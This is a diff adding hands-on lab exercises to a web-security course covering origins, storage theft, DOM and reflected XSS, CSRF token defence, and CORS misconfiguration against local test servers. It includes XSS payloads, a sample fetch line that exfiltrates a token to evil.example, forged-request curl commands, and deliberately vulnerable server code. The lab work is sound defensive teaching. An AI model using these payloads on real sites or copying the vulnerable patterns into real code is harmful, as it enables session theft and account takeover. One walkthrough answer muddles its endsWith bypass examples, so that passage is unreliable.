@@ -5608,6 +5608,81 @@ document.cookie                   // -> "readable_session=abc123"       (STOLEN)
 5. Any four of: \`innerHTML\`/\`outerHTML\`/\`insertAdjacentHTML\` (parse string as HTML), \`document.write\` (write HTML during parse), \`eval\`/\`new Function\` (execute string as JS), framework escape hatches like \`dangerouslySetInnerHTML\`/\`v-html\` (bypass auto-escaping).
 </details>
 
+---
+
+### 🧪 Workbench: think in origins, then in blast radius
+
+> **What this trains.** This module is conceptual, so its Workbench is too — but it's still *production*, not recognition: you'll construct origins to a spec, run the exact lines an XSS uses to steal storage, and make the storage-choice argument a security engineer has to make in code review. The console tasks touch only your own browser and change nothing on any server.
+
+**The rule:** answer/predict before you verify or open a walkthrough.
+
+#### 🟢 Drill 1 — construct cross-origin URLs ~4 min
+
+Given the base origin \`https://app.example.com\` (default port 443):
+
+**Goal.** Write **three** URLs that are each *cross-origin* to it — and each for a **different** one of the three reasons (scheme, host, port). Then write one more that is *same-origin* despite looking different.
+
+**Done when.** Your three cross-origin URLs each differ from the base in exactly one component (one scheme, one host, one port), and you can name which component for each; your same-origin one differs only in path/query.
+
+<details>
+<summary>Walkthrough — open after you've written your four URLs</summary>
+
+- **Different scheme:** \`http://app.example.com\` — \`http\` ≠ \`https\`, cross-origin even though host and (implied) everything else matches.
+- **Different host:** \`https://api.example.com\` — a different subdomain is a different host, so cross-origin. (\`app\` vs \`api\` is enough; sharing \`example.com\` does *not* make them same-origin.)
+- **Different port:** \`https://app.example.com:8080\` — \`:8080\` ≠ the default \`:443\`, cross-origin.
+- **Same-origin despite looking different:** \`https://app.example.com/admin?x=1#frag\` — path, query, and fragment are **not** part of the origin, so this is the *same* origin as the base.
+
+The trap most people fall into is thinking "same domain = same origin." It isn't: the origin is the **(scheme, host, port)** triple, and subdomains are different hosts. Every browser security rule you meet for the rest of this phase — SOP, CORS, cookie scope, CSP — is phrased against this triple, so getting it reflexive now makes the rest deduction instead of memorization.
+</details>
+
+#### 🟢 Drill 2 — run the theft an XSS would run ~5 min
+
+Create and open \`storage-lab.html\`:
+\`\`\`html
+<!doctype html>
+<html><body><script>
+  localStorage.setItem("token", "SESSION-TOKEN-PRETEND-SECRET");
+  document.cookie = "readable_session=abc123; SameSite=Lax";
+<\/script></body></html>
+\`\`\`
+
+**Goal.** In the DevTools console, write the lines an injected script would use to read *both* the localStorage token and the cookie — then state which of the two an \`HttpOnly\` flag would have protected, and why the other can't be protected that way.
+
+**Done when.** Both values print in your console, and you can say: \`HttpOnly\` would hide the *cookie* from \`document.cookie\` (defeating that theft) but does nothing for \`localStorage\`, which is *always* JS-readable.
+
+<details>
+<summary>Walkthrough — open after you've run it</summary>
+
+\`\`\`javascript
+localStorage.getItem("token");   // "SESSION-TOKEN-PRETEND-SECRET"  — stolen
+document.cookie;                 // "readable_session=abc123"       — stolen
+\`\`\`
+
+Both are one line away from exfiltration (\`fetch("https://evil.example/c?t=" + localStorage.getItem("token"))\`). The asymmetry is the whole lesson: mark that cookie \`HttpOnly\` and \`document.cookie\` returns nothing for it — JS, and therefore any XSS, simply cannot see it. But **there is no \`HttpOnly\` for \`localStorage\`**; it's a JavaScript API by definition, so anything stored there is readable by any script that runs on the page. That's why "storage choice decides how bad an XSS is" is not a slogan — you just watched the same XSS payload succeed against one store and be blind to the other.
+</details>
+
+#### 🔴 Break & Defend — win the code-review argument ~12 min
+
+A teammate stores the app's session **JWT in \`localStorage\`** "because we're an SPA calling a separate API, and cookies are annoying with CORS." In your journal:
+
+1. Lay out the concrete attack chain that makes this dangerous — start it from a *single* XSS bug anywhere in the app and end it at account takeover.
+2. State the fix and its trade-off honestly (it's not free).
+3. **Outside the box:** name the case where a token in JS-readable storage *is* defensible, and what compensating controls it demands.
+
+**Done when.** Your chain is "one XSS → read the token from localStorage → exfiltrate → attacker replays it as the user," your fix is an \`HttpOnly\` (+ \`Secure\`, \`SameSite\`) cookie for the session, and you've acknowledged both the trade-off and a defensible localStorage case.
+
+<details>
+<summary>Walkthrough — open after you've written your argument</summary>
+
+**1. The chain — why it's one bug away from catastrophe.** Any single XSS anywhere the app renders untrusted data (one missed sink, one vulnerable dependency, one \`dangerouslySetInnerHTML\`) gives an attacker script execution in your origin. That script runs \`localStorage.getItem("jwt")\`, reads the token, and \`fetch()\`s it to an attacker server. The attacker now replays that JWT as the \`Authorization: Bearer\` header and *is* the user until the token expires. The token in localStorage turned "an XSS somewhere" into "full account takeover" — the storage choice set the **blast radius**.
+
+**2. The fix and its honest trade-off.** Put the session in a **\`Secure; HttpOnly; SameSite\`** cookie (Module 6.2). \`HttpOnly\` means the same XSS *cannot read it* — the theft chain breaks at step two. The trade-off is real: cookies are auto-sent, so you now have to defend **CSRF** (Module 2.3) and get **cookie/CORS** settings right for a separate API domain (\`SameSite\`, credentialed CORS). That's more setup than dropping a string in localStorage — but it removes an entire vulnerability class (token theft via XSS) in exchange for a well-understood, well-tooled one (CSRF, which has standard defenses). That's a good trade, and naming it *is* the senior move — not pretending the cookie approach is cost-free.
+
+**3. Outside the box — when localStorage is defensible.** Short-lived access tokens in an SPA *can* live in memory or localStorage **if** you've accepted the exposure with eyes open: a strict CSP to shrink the XSS surface, short token TTLs with silent refresh so a stolen token dies fast, and refresh tokens kept in an \`HttpOnly\` cookie (never in JS storage) so the long-lived credential is never reachable by script. The point isn't "localStorage is forbidden" — it's that choosing it obligates you to *those* compensating controls, and a reviewer who can't name them shouldn't be choosing it. This "the choice is fine only with its compensating controls" reasoning is exactly how mature security decisions are made — not by rules, but by knowing what each choice costs.
+</details>
+
+---
+
 ➡️ **Next step:** The most common way attacker text becomes attacker code in the browser is XSS. Let's go deep. Continue to **Module 2.2: XSS Deep Dive**.`,
     tracker: ["Built storage-lab.html and read the localStorage token + non-HttpOnly cookie from the console", "Can define origin as (scheme, host, port) and give a cross-origin example", "Can state what SOP restricts and the send-but-can't-read gap CSRF uses", "Memorized the dangerous DOM sinks list", "Answered the knowledge check"]
   }, {
@@ -5795,8 +5870,136 @@ For rich-text that must allow *some* HTML (a comment with bold/links), sanitize 
 5. Changing \`innerHTML\` to \`textContent\`. \`innerHTML\` parses the string as HTML (so the \`onerror\` runs); \`textContent\` inserts it as literal text that is never interpreted as markup.
 </details>
 
+---
+
+### 🧪 Workbench: make the payload run, then see why "escaping" isn't one thing
+
+> **What this trains.** XSS is the browser twin of SQL injection, and the way to *feel* that is to inject a script yourself, watch it run, then break the naive fix. The reflected-XSS proof here needs no browser — you'll verify the *server's output* with \`curl\` (raw \`<script>\` vs encoded \`&lt;script&gt;\`), which is exactly what makes it a clean, checkable exercise. The DOM task uses your own browser.
+
+**The rule:** craft the payload / write the fix yourself before opening a walkthrough.
+
+#### 🟢 Drill 1 — DOM XSS, then the one-word fix ~6 min
+
+Create \`dom-xss.html\`:
+\`\`\`html
+<!doctype html>
+<html><body><div id="out"></div><script>
+  const name = decodeURIComponent(location.hash.slice(1));
+  document.getElementById("out").innerHTML = "Hello, " + name;   // sink
+<\/script></body></html>
+\`\`\`
+
+**Goal.** Open it with a URL-fragment payload that makes an \`alert\` fire *without* using a \`<script>\` tag (the element is inserted after parsing, so \`<script>\` in innerHTML won't run — you need an event-handler payload). Then change **one** DOM API to kill it and confirm the payload becomes inert text.
+
+**Done when.** Your payload fires an alert against the vulnerable version, and after your one-word change the same payload shows as literal characters.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+An \`<img>\` that fails to load runs its \`onerror\` — \`<img src=x onerror=alert(1)>\` — and that executes even when injected via \`innerHTML\`, unlike a bare \`<script>\`. The fix is the API that writes a string as *text* instead of parsing it as *HTML*; the module named it.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run it</summary>
+
+\`\`\`bash
+open "dom-xss.html#<img src=x onerror=alert('dom-xss')>"   # macOS; Linux xdg-open; or paste the URL
+\`\`\`
+The image fails, its \`onerror\` runs, the alert fires — pure DOM XSS, no server involved. Why not \`<script>\`? When you assign to \`innerHTML\`, the HTML parser *does* build any \`<script>\` node but the HTML spec says script elements inserted this way don't execute — so attackers reach for event handlers (\`onerror\`, \`onload\`, \`onmouseover\`) instead. Knowing that is the difference between "my payload didn't work so it must be safe" and actually testing it properly.
+
+**The fix — one word:**
+\`\`\`javascript
+document.getElementById("out").textContent = "Hello, " + name;   // was innerHTML
+\`\`\`
+\`innerHTML\` *parses* the string as markup; \`textContent\` inserts it as inert text that is never interpreted. Same data, different sink, opposite outcome — which is the module's whole point about *where* data lands mattering more than the data itself.
+</details>
+
+#### 🟡 Build 1 — reflected XSS, proven with curl ~8 min
+
+Spin up a dependency-free reflecting server:
+\`\`\`bash
+mkdir -p ~/xss-workbench && cd ~/xss-workbench
+cat > search.js <<'EOF'
+const http = require("http");
+const { URL } = require("url");
+function htmlEscape(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+http.createServer((req, res) => {
+  const u = new URL(req.url, "http://localhost:4602");
+  const q = u.searchParams.get("q") || "";
+  res.setHeader("Content-Type", "text/html");
+  if (u.pathname === "/vuln")  return res.end(\`<h1>Results for \${q}</h1>\`);
+  if (u.pathname === "/fixed") return res.end(\`<h1>Results for \${htmlEscape(q)}</h1>\`);
+  res.end("try /vuln?q=hello or /fixed?q=hello");
+}).listen(4602, () => console.log("xss lab on http://localhost:4602"));
+EOF
+node search.js     # leave running
+\`\`\`
+
+**Goal.** Without a browser, use \`curl\` to prove the \`/vuln\` endpoint reflects a \`<script>\` payload **raw** into its HTML (so a browser would execute it), and that \`/fixed\` returns the *same* payload **encoded** (so a browser renders it as text).
+
+**Done when.** Your \`curl\` of \`/vuln\` shows a literal \`<script>...\` inside the \`<h1>\`, and your \`curl\` of \`/fixed\` shows \`&lt;script&gt;...\` instead.
+
+<details>
+<summary>Walkthrough — open after you've run it</summary>
+
+\`\`\`bash
+curl -s "http://localhost:4602/vuln?q=<script>alert(1)<\/script>"
+# <h1>Results for <script>alert(1)<\/script></h1>      <- raw: a browser RUNS this
+
+curl -s "http://localhost:4602/fixed?q=<script>alert(1)<\/script>"
+# <h1>Results for &lt;script&gt;alert(1)&lt;/script&gt;</h1>   <- encoded: inert text
+\`\`\`
+
+This is the most important habit in the whole module: you didn't need a browser or an \`alert\` to *know* the vulnerability is real — you read the server's raw output and saw the \`<script>\` come back unencoded, sitting in an HTML context where the browser will parse it. Being able to confirm XSS from the response bytes (rather than only by seeing a popup) is exactly how you'd verify it in an API response, a JSON field later rendered as HTML, or a header — places where "just open it in a browser" doesn't apply. The fix is output encoding *for the HTML context*; \`htmlEscape\` turns the code back into data.
+</details>
+
+#### 🔴 Break & Defend — the context trap ~12 min
+
+Here's a server that *does* HTML-escape its input — and is still vulnerable, because the input lands in a different context:
+\`\`\`js
+// reflects user input into an href ATTRIBUTE, with HTML-escaping applied
+const link = htmlEscape(u.searchParams.get("url") || "");
+res.end(\`<a href="\${link}">continue</a>\`);
+\`\`\`
+
+**Your task, in your journal:**
+1. \`htmlEscape\` encodes \`< > & " '\`. Explain why this page is *still* an XSS even with that escaping — and give the exact \`url\` value that executes script when a user clicks the link.
+2. Write the correct fix for this context, and state the general rule it illustrates.
+
+**Done when.** Your payload is a \`javascript:\` URL (which contains none of the characters \`htmlEscape\` touches), your fix validates the URL **scheme against an allow-list** (\`http\`/\`https\`/\`mailto\`), and you've stated the rule: *encode for the context the data lands in — escaping is not one operation.*
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+Look at what \`htmlEscape\` actually changes: \`< > & " '\`. Now think of a URL that is dangerous but contains **none** of those characters. What scheme, placed in an \`href\`, runs code when clicked? The escaping is real — it's just solving the wrong problem for *this* context.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answer</summary>
+
+**1. Why escaping doesn't save it.** The value sits inside \`href="..."\` — a **URL context**, not an HTML-body context. \`htmlEscape\` neutralizes tag/attribute-breaking characters, but \`javascript:alert(document.domain)\` contains none of \`< > & " '\` — it passes through the escaper untouched, and when the user clicks, the browser executes the \`javascript:\` scheme:
+\`\`\`
+/that-route?url=javascript:alert(document.domain)
+-> <a href="javascript:alert(document.domain)">continue</a>   (escaping changed nothing)
+\`\`\`
+The escaping *worked* — it just protected against the wrong context. This is the module's "I escaped \`<\` and \`>\`, so I'm safe" trap, made concrete.
+
+**2. The fix — validate the scheme:**
+\`\`\`js
+function safeUrl(raw){
+  try { const u = new URL(raw, "http://localhost");
+        return ["http:","https:","mailto:"].includes(u.protocol) ? raw : "#"; }
+  catch { return "#"; }               // unparseable -> harmless default
+}
+res.end(\`<a href="\${htmlEscape(safeUrl(userUrl))}">continue</a>\`);   // allow-list THEN encode
+\`\`\`
+**The rule:** *encode/validate for the specific context the data lands in.* The same value is safe in an HTML body, needs quote-encoding in an attribute, needs a scheme allow-list in a URL, and needs JS-string escaping in a script. "Escaping" is not a single switch you flip once — it's context-specific, which is why the primary defense is *output encoding matched to the sink*, and why frameworks that auto-encode per context (and refuse \`javascript:\` hrefs) prevent this class by default. Same root cause as everything in this phase: data crossing into a code channel — here, the URL-scheme channel.
+</details>
+
+---
+
 ➡️ **Next step:** XSS abuses code running in your origin. The next attack abuses the browser *sending your cookies* to your origin on a request the user never intended. Continue to **Module 2.3: CSRF and Browser-Automatic Credentials**.`,
-    tracker: ["Built dom-xss.html, fired the payload, then fixed it with textContent", "Built the reflected-XSS Express route and fixed it with context encoding", "Read the Flask + Jinja2 dual-language version (autoescaping, |safe trap)", "Can distinguish reflected vs stored vs DOM XSS by where the input lives", "Can explain why encoding must match the output context", "Answered the knowledge check"]
+    tracker: ["Built dom-xss.html, fired the payload, then fixed it with textContent", "Built the reflected-XSS Express route and fixed it with context encoding", "Read the Flask + Jinja2 dual-language version (autoescaping, |safe trap)", "Can distinguish reflected vs stored vs DOM XSS by where the input lives", "Can explain why encoding must match the output context", "Answered the knowledge check", "Workbench: fired a DOM-XSS onerror payload and killed it with textContent; proved reflected XSS via curl (raw <script> vs &lt;script&gt;)", "Workbench: broke an HTML-escaped href with a javascript: URL and fixed it with a scheme allow-list — the context-matters rule"]
   }, {
     id: "m2-3",
     phaseId: "p2",
@@ -6014,8 +6217,121 @@ For a JSON/SPA API, Flask-WTF reads the token from the \`X-CSRFToken\` header in
 5. JSON reduces the *simplest* form-based CSRF but isn't immunity: misconfigured CORS, endpoints that also accept form-encoded bodies, or GET-based state changes can reopen it. Use \`SameSite\` + CSRF tokens regardless.
 </details>
 
+---
+
+### 🧪 Workbench: forge the request, then prove the token stops it
+
+> **What this trains.** CSRF clicks into place the moment you *forge* an authenticated request yourself and watch the server accept it — then add the one check that makes the same forgery fail. The core of this is curl-verifiable: a cross-site POST is just a request carrying the victim's cookie, and \`curl -b\` lets you send exactly that. (\`SameSite\` is enforced by the *browser*, not curl, so that layer stays a reasoning task — the token layer is what you'll prove at the command line.)
+
+Spin up a dependency-free victim that exposes both a vulnerable and a token-defended path:
+\`\`\`bash
+mkdir -p ~/csrf-workbench && cd ~/csrf-workbench
+cat > victim.js <<'EOF'
+const http = require("http");
+const crypto = require("crypto");
+const { URL } = require("url");
+let email = "victim@example.com";
+const tokens = new Map();
+function parseCookies(h){const o={};(h||"").split(";").forEach(p=>{const i=p.indexOf("=");if(i>0)o[p.slice(0,i).trim()]=p.slice(i+1).trim();});return o;}
+function body(req){return new Promise(r=>{let d="";req.on("data",c=>d+=c);req.on("end",()=>r(new URLSearchParams(d)));});}
+http.createServer(async (req, res) => {
+  const u = new URL(req.url, "http://localhost:4603");
+  const cookies = parseCookies(req.headers.cookie);
+  if (u.pathname === "/login") { res.setHeader("Set-Cookie","session=valid-session-for-victim; HttpOnly"); return res.end("logged in"); }
+  if (u.pathname === "/account") return res.end("current email: " + email);
+  if (u.pathname === "/token") { const t=crypto.randomBytes(16).toString("hex"); tokens.set(cookies.session,t); return res.end(t); }
+  if (u.pathname === "/account/email" && req.method === "POST") {
+    if (cookies.session !== "valid-session-for-victim") { res.statusCode=401; return res.end("no session"); }
+    const form = await body(req);
+    if (u.searchParams.get("protected") === "1") {                 // token-defended variant
+      if (form.get("_csrf") !== tokens.get(cookies.session)) { res.statusCode=403; return res.end("bad csrf"); }
+    }
+    email = form.get("email"); return res.end("email changed to " + email);
+  }
+  res.end("ok");
+}).listen(4603, ()=>console.log("victim on http://localhost:4603"));
+EOF
+node victim.js     # leave running
+\`\`\`
+
+**The rule:** write each request/answer before opening a walkthrough.
+
+#### 🟢 Drill 1 — forge the state change ~6 min
+
+The victim's browser holds \`session=valid-session-for-victim\` (that's what \`evil.com\` would silently borrow). **Playing the forged cross-site request**, use \`curl\` to change the victim's email on the **unprotected** endpoint (\`/account/email\`, no \`protected=1\`) using only that cookie — then confirm it changed.
+
+**Done when.** Your POST returns \`email changed to …\`, and \`curl …/account\` shows the attacker's address — proving the server accepted a request it had no way to know was forged.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+A cross-site POST is a POST that carries the victim's cookie. \`curl\` sends a cookie with \`-b "name=value"\`, a form body with \`-d\`, and picks POST automatically when you use \`-d\`. You are *simulating* what the browser does automatically on \`evil.com\`'s behalf.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run it</summary>
+
+\`\`\`bash
+curl -s -X POST -b "session=valid-session-for-victim" -d "email=attacker@evil.example" \\
+  "http://localhost:4603/account/email"
+# email changed to attacker@evil.example
+curl -s "http://localhost:4603/account"
+# current email: attacker@evil.example
+\`\`\`
+
+That's CSRF in one command. Notice what the server checked: *is the session cookie valid?* Yes — because it genuinely is the victim's. The server had **no way to tell** this request was forged, because a valid cookie proves *who* the user is, never *that the request came from its own site*. On a real attack the victim just visits \`evil.com\`; their browser attaches this cookie automatically and fires the POST. Your \`curl -b\` is doing by hand exactly what the browser does on its own — which is why "the cookie is valid" is the wrong thing to be reassured by.
+</details>
+
+#### 🔴 Break & Defend — the token that evil.com can't forge ~15 min
+
+Now use the **protected** endpoint (add \`?protected=1\`), which requires a per-session CSRF token.
+
+**Your task:**
+1. Show that the *same* forged POST as Drill 1 — cookie but **no token** — is now rejected. What status?
+2. Then perform the request the way the *legitimate* site does: obtain the token from \`/token\` (as your own page would embed it), and submit the POST **with** it. Confirm it succeeds.
+3. In your journal: (a) why can \`evil.com\` *not* obtain that token to forge a valid request? (b) You set \`SameSite=Lax\` and someone says "tokens are now redundant" — give one case where they're still needed. (c) Rebut "my API is JSON, so I'm immune."
+
+**Done when.** The no-token forgery returns \`403\`, the with-token request returns \`200\`/\`email changed\`, and your journal names SOP as why the attacker can't read the token, plus a residual case for tokens (state-changing GET, or \`SameSite=None\` widget) and a way JSON APIs still get CSRF'd.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+The token endpoint returns a value tied to your session cookie; capture it (\`T=$(curl … /token)\`) and pass it as the \`_csrf\` form field alongside \`email\`. For part 3a, recall what SOP forbids \`evil.com\`'s scripts from doing to your pages.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answers</summary>
+
+**1. Forgery without the token — rejected:**
+\`\`\`bash
+curl -s -o /dev/null -w "HTTP %{http_code}\\n" -X POST \\
+  -b "session=valid-session-for-victim" -d "email=hacker@evil.example" \\
+  "http://localhost:4603/account/email?protected=1"
+# HTTP 403
+\`\`\`
+
+**2. The legitimate flow — token obtained, then submitted:**
+\`\`\`bash
+T=$(curl -s -b "session=valid-session-for-victim" "http://localhost:4603/token")
+curl -s -X POST -b "session=valid-session-for-victim" \\
+  -d "email=me@example.com&_csrf=$T" \\
+  "http://localhost:4603/account/email?protected=1"
+# email changed to me@example.com
+\`\`\`
+
+**3a. Why evil.com can't forge it.** The token is random and embedded in *your* page. The **Same-Origin Policy** forbids \`evil.com\`'s scripts from *reading the contents* of your pages or responses — so the attacker can auto-submit a form to your endpoint, but cannot learn the one value that endpoint now demands. The forged POST arrives tokenless → 403. This is the elegant part: the defense works *because* of the same SOP gap that CSRF exploits — SOP lets them *send* but not *read*, so a secret they must *read* to include defeats them.
+
+**3b. Why SameSite doesn't retire tokens.** \`SameSite=Lax\` blocks the cookie on cross-site *POST/fetch/iframe*, which kills classic form CSRF — but it does **not** cover state-changing **GET** requests (an \`<img src=".../account/delete?id=…">\` still fires with the cookie on a top-level context), and it doesn't apply to cookies deliberately set \`SameSite=None\` for embedded/SSO widgets. In those cases the token is the thing still standing. Defense-in-depth: \`SameSite\` as the cheap default, tokens for the cases it misses.
+
+**3c. "JSON API so I'm immune" — no.** JSON reduces the *simplest* HTML-form CSRF (a plain \`<form>\` can't send \`application/json\` cross-site without tripping a CORS preflight). But it's not immunity: if the endpoint *also* accepts \`application/x-www-form-urlencoded\` (many do by default), a form posts to it fine; a **misconfigured CORS** policy (next module) can grant the cross-origin request outright; and any GET that changes state is wide open. The fix is the same regardless of content type: \`SameSite\` + a token the attacker can't read.
+
+**Outside the box:** every layer here is the same idea from a different angle — *prove the request came from your own site, don't just prove the user is logged in.* SameSite proves it at the browser; the token proves it at the app; Origin/Referer checks prove it at the header. You reach for more layers as the cookie's \`SameSite\` protection weakens (Strict → Lax → None). Clean up: \`Ctrl+C\` the server.
+</details>
+
+---
+
 ➡️ **Next step:** CSRF defenses and many real bugs hinge on getting cross-origin sharing right. Misconfigure CORS and you hand attackers the cross-origin *reads* SOP was protecting. Continue to **Module 2.4: CORS Misconfiguration**.`,
-    tracker: ["Stood up csrf-victim.js + attacker.html on two origins and silently changed the victim's email", "Defended with SameSite=Lax and confirmed the cross-site POST is blocked", "Added the synchronizer CSRF token layer and saw the 403", "Read the Flask + Flask-WTF dual-language version", "Can explain why 'my API is JSON' is not a CSRF defense", "Answered the knowledge check"]
+    tracker: ["Stood up csrf-victim.js + attacker.html on two origins and silently changed the victim's email", "Defended with SameSite=Lax and confirmed the cross-site POST is blocked", "Added the synchronizer CSRF token layer and saw the 403", "Read the Flask + Flask-WTF dual-language version", "Can explain why 'my API is JSON' is not a CSRF defense", "Answered the knowledge check", "Workbench: forged the email-change with curl -b (cookie only) against the unprotected route", "Workbench: proved the token route 403s without the token and 200s with it, and journalled why SOP stops evil.com reading it + residual cases for tokens"]
   }, {
     id: "m2-4",
     phaseId: "p2",
@@ -6196,6 +6512,102 @@ Two Python-specific pitfalls: do **not** pass \`origins="*"\` (or omit \`origins
 5. \`endsWith("example.com")\` matches attacker-controlled hostnames like \`evilexample.com\` or \`example.com.evil.com\`, granting them access. Compare origins with exact equality against an allow-list.
 </details>
 
+---
+
+### 🧪 Workbench: read the header that is the vulnerability
+
+> **What this trains.** CORS lives entirely in one server-emitted header, so you can *see* the bug directly: send an \`Origin\` with \`curl\` and read what \`Access-Control-Allow-Origin\` the server hands back. A subtlety the module raised makes this the *right* tool: \`curl\` itself ignores CORS (it's not a browser), but the header \`curl\` shows you is exactly the decision a browser would enforce — so inspecting it tells you whether a browser *would* let \`evil.com\` read the response.
+
+Spin up a dependency-free API with a vulnerable and a fixed mode:
+\`\`\`bash
+mkdir -p ~/cors-workbench && cd ~/cors-workbench
+cat > api.js <<'EOF'
+const http = require("http");
+const { URL } = require("url");
+const ALLOWED = new Set(["https://app.example.com", "https://admin.example.com"]);
+http.createServer((req, res) => {
+  const u = new URL(req.url, "http://localhost:4604");
+  const origin = req.headers.origin;
+  if (u.searchParams.get("fixed") === "1") {                 // exact allow-list
+    if (origin && ALLOWED.has(origin)) { res.setHeader("Access-Control-Allow-Origin", origin); res.setHeader("Access-Control-Allow-Credentials","true"); }
+  } else {                                                   // reflect ANY origin + credentials
+    if (origin) { res.setHeader("Access-Control-Allow-Origin", origin); res.setHeader("Access-Control-Allow-Credentials","true"); }
+  }
+  res.setHeader("Content-Type","application/json");
+  res.end(JSON.stringify({ email: "victim@example.com", ssn: "PRETEND-PRIVATE-DATA" }));
+}).listen(4604, ()=>console.log("api on http://localhost:4604"));
+EOF
+node api.js     # leave running
+\`\`\`
+
+**The rule:** predict the header before you run each request.
+
+#### 🟢 Drill 1 — watch the API trust evil.com ~5 min
+
+**Goal.** Using \`curl\`, send a request to the **vulnerable** endpoint claiming to come from \`https://evil.example\`, and read the CORS response headers. Confirm the server *reflects your evil origin* back as allowed, with credentials permitted.
+
+**Done when.** The response includes \`Access-Control-Allow-Origin: https://evil.example\` and \`Access-Control-Allow-Credentials: true\` — i.e. the server just told the browser "yes, evil.example may read this authenticated response."
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+You set a request header with \`-H "Origin: https://evil.example"\`, and you read *response* headers with \`-i\` (include headers) — filter to the CORS ones with \`grep -i access-control\`.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run it</summary>
+
+\`\`\`bash
+curl -s -i -H "Origin: https://evil.example" "http://localhost:4604/api/me" | grep -i access-control
+# Access-Control-Allow-Origin: https://evil.example
+# Access-Control-Allow-Credentials: true
+\`\`\`
+
+That pair of headers *is* the vulnerability. The server didn't check whether \`evil.example\` is trusted — it echoed back whatever \`Origin\` arrived and said "credentials welcome." In a browser, that's the green light for a script on \`evil.example\` to \`fetch(..., {credentials:"include"})\` your API in a logged-in victim's session and **read the private response**. You proved it without a browser because the *server's decision* is right there in the header — and the server's decision is the whole ballgame. This is why \`origin: true, credentials: true\` is a critical bug, not a convenience toggle.
+</details>
+
+#### 🔴 Break & Defend — allow-list, and the lookalike trap ~15 min
+
+Switch to the **fixed** endpoint (append \`?fixed=1\`), which allow-lists exact origins.
+
+**Your task:**
+1. With \`curl\`, show that \`https://evil.example\` now gets **no** \`Access-Control-Allow-Origin\` header (browser would block the read), while an allow-listed origin like \`https://app.example.com\` **does** get it.
+2. In your journal: a developer "fixes" CORS with \`if (origin.endsWith("example.com")) allow(origin)\`. Give **two** attacker origins that pass this check but are not yours.
+3. Rebut this claim in one or two sentences: *"CORS protects my API, and anyway curl ignores it, so my data is safe."*
+
+**Done when.** Your curl proof shows the allow-list discriminating (evil → no ACAO, app.example.com → ACAO present), your journal lists two \`endsWith\` bypasses, and you've explained that CORS is a browser-only read-permission mechanism, **not** authorization.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+For part 2, \`endsWith("example.com")\` only checks the *tail* of the string — think of a domain the attacker can register that *ends with* those characters, and a subdomain trick where "example.com" appears but isn't the real registrable domain. For part 3, ask: what does CORS actually stop, and who obeys it?
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answers</summary>
+
+**1. The allow-list discriminating:**
+\`\`\`bash
+curl -s -i -H "Origin: https://evil.example"     "http://localhost:4604/api/me?fixed=1" | grep -i access-control || echo "no ACAO -> browser blocks the read"
+curl -s -i -H "Origin: https://app.example.com"  "http://localhost:4604/api/me?fixed=1" | grep -i access-control
+# (evil) -> no ACAO
+# (app)  -> Access-Control-Allow-Origin: https://app.example.com
+\`\`\`
+Exact-match allow-listing: the server emits \`ACAO\` *only* for origins it explicitly trusts, so a browser will never let \`evil.example\` read the response. Nothing is reflected.
+
+**2. Two bypasses of \`endsWith("example.com")\`:**
+- \`https://evilexample.com\` — the string ends with \`example.com\` (no separating dot), but it's a *completely different registrable domain* the attacker owns.
+- \`https://example.com.evil.com\` — ends with... no, that ends in \`evil.com\`; the real trap is \`https://app.example.com.evil.com\` for a check like \`includes\`, and for \`endsWith("example.com")\` the classic is **\`https://notexample.com\`** / **\`https://evilexample.com\`**. Both *end with* \`example.com\` yet are attacker-controlled. The root error is identical to the open-redirect prefix trap (1.1) and the SQL blocklist (0.5): **reasoning about a substring of attacker-controlled text instead of matching an exact, closed set.** Fix: compare the full origin against an allow-list with \`===\`/\`Set.has\`.
+
+**3. Rebutting "CORS protects my API":** CORS is **not** protection and **not** authorization — it's a *relaxation* of the browser's default Same-Origin read-blocking, and it is enforced **only by browsers**. \`curl\`, Postman, and any server-to-server client ignore CORS entirely and read your responses regardless of what headers you send. So (a) CORS never "protects" data — real access control must be enforced server-side per request (Phase 6), and (b) "curl ignores it so I'm safe" is backwards: the fact that curl ignores it is precisely *why* CORS can't be your access control. CORS only decides which *web origins* a *browser* will let read a response; it assumes you've already done authorization properly underneath.
+
+**Outside the box — why reflection is so tempting.** The browser forbids \`Access-Control-Allow-Origin: *\` together with credentials (that would let every site read every logged-in user's data). Developers who need credentialed cross-origin calls hit that wall and "solve" it by reflecting the request's origin — which technically satisfies "not a wildcard" while actually allowing *everyone*, one origin at a time. Recognizing that reflection is just \`*\`-with-extra-steps is the insight; the real answer is always the explicit exact allow-list. Clean up: \`Ctrl+C\` the server.
+</details>
+
+---
+
+> **Phase 2 complete.** You've made the browser's trust model concrete: constructed origins, stolen JS-readable storage, fired XSS and watched output-encoding kill it, forged a CSRF request and blocked it with a token, and read the one header that turns CORS into a data leak. Every one proven by something you ran, not just read. Now to the server, where the trust is actually enforced.
+
 ➡️ **Next step:** You've secured the browser side — storage, XSS, CSRF, CORS. Now move to the server, where trust is actually enforced: hardening Express, killing SQL injection, and locking down APIs and uploads. Continue to **Phase 3: Backend, API, and Database Security**.
 
 ### Phase 2 Deliverable
@@ -6218,7 +6630,7 @@ Create \`~/appsec-journal/notes/phase-2-browser-security.md\` and answer, in you
 - **A new review habit:** answers vary, but common ones: checking that any new cookie holding a session/auth token is \`HttpOnly\` + \`SameSite\` + \`Secure\`; checking CORS config for exact-origin allow-lists instead of \`origin: true\`/reflected origins; checking that user-supplied HTML never reaches \`innerHTML\`/\`dangerouslySetInnerHTML\` without sanitization; confirming a CSP header exists at all.
 
 </details>`,
